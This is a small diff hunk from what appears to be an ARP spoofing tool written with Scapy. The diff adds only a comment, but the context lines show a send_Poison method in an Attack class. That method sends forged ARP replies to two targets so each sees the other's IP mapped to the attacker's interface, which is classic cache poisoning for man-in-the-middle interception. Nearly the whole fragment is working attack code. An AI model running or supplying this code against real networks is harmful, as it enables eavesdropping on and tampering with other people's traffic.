@@ -51,6 +51,7 @@ class Attack:
         self.interface = interface
 
     def send_Poison(self, MACs):
+        # construct & send ARP packets
         send(ARP(op=2, pdst=self.target1, psrc=self.target2, hwdst=MACs[0]), iface=self.interface)
         send(ARP(op=2, pdst=self.target2, psrc=self.target1, hwdst=MACs[1]), iface=self.interface)
 
